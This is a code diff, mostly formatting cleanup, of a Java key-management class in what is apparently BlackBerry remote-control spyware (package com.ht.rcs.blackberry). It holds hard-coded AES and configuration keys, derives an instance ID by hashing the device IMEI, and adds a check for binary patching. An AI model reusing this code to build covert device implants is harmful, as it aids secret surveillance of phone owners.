@@ -12,7 +12,7 @@ import com.ht.rcs.blackberry.crypto.Encryption;
 import com.ht.rcs.blackberry.interfaces.Singleton;
 import com.ht.rcs.blackberry.utils.Utils;
 
-public class Keys implements Singleton  {
+public class Keys implements Singleton {
     private static String conf = "Adf5V57gQtyi90wUhpb8Neg56756j87R";
     private static String aes = "3j9WmmDgBqyU270FTid3719g64bP4s52"; // markup,
     // log
@@ -28,27 +28,33 @@ public class Keys implements Singleton  {
     private static byte[] byteConfNameKey;
     private static byte[] byteInstanceID;
 
-    static Keys instance=null;
-    private Keys() {         
+    static Keys instance = null;
+
+    private Keys() {
         byte[] imei = GPRSInfo.getIMEI();
-        byteInstanceID =  Encryption.SHA1(imei);    
-        instanceID =  Utils.byteArrayToHex(byteInstanceID);        
+        byteInstanceID = Encryption.SHA1(imei);
+        instanceID = Utils.byteArrayToHex(byteInstanceID);
     };
     
-    public synchronized static Keys getInstance(){
-        if(instance == null) {
-            instance = new Keys();            
+    public static synchronized Keys getInstance() {
+        if (instance == null) {
+            instance = new Keys();
         }
-        
+
         return instance;
     }
-    
+
+    public static boolean hasBeenBinaryPatched() {
+        return !buildID.equals("av3pVck1gb4eR2d8");
+    }
+
     public byte[] getAesKey() {
         if (byteAesKey == null) {
             byteAesKey = keyFromString(aes);
         }
         return byteAesKey;
     }
+
     public void setAesKey(byte[] key) {
         byteAesKey = key;
     }
@@ -56,6 +62,7 @@ public class Keys implements Singleton  {
     public byte[] getBuildId() {
         return buildID.getBytes();
     }
+
     public void setBuildID(String build) {
         buildID = build;
     }
@@ -67,7 +74,7 @@ public class Keys implements Singleton  {
 
         return byteChallengeKey;
     }
-    
+
     public void setChallengeKey(byte[] challenge_) {
         byteChallengeKey = challenge_;
     }
@@ -79,10 +86,11 @@ public class Keys implements Singleton  {
 
         return byteConfKey;
     }
+
     public void setConfKey(byte[] conf_) {
         byteConfKey = conf_;
     }
-    
+
     public byte[] getConfNameKey() {
         if (byteConfNameKey == null) {
             byteConfNameKey = keyFromString(confName);
@@ -101,5 +109,5 @@ public class Keys implements Singleton  {
         Utils.copy(key, 0, string.getBytes(), 0, 16);
         return key;
     }
-    
+
 }
